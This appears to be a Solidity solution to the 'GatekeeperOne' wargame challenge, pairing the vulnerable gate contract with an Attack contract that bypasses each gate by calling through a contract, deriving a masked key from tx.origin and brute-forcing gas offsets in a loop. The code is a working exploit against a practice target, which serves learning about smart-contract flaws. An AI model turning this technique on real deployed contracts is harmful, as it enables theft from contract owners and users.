// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin, "gate one");
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0, "gate two");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Attack {
    GatekeeperOne gate;

     constructor(address target) {
        gate = GatekeeperOne(target);
    }

    function attack() public {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        // Ищем offset от 0 до 8191, чтобы попасть в точное значение
        for (uint256 i = 200; i < 8191; i++) {
            (bool success,) =  address(gate).call{gas: 8191 * 3 + i}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                console.log("success", 8191 * 3 + i);
            }
        }
    }
}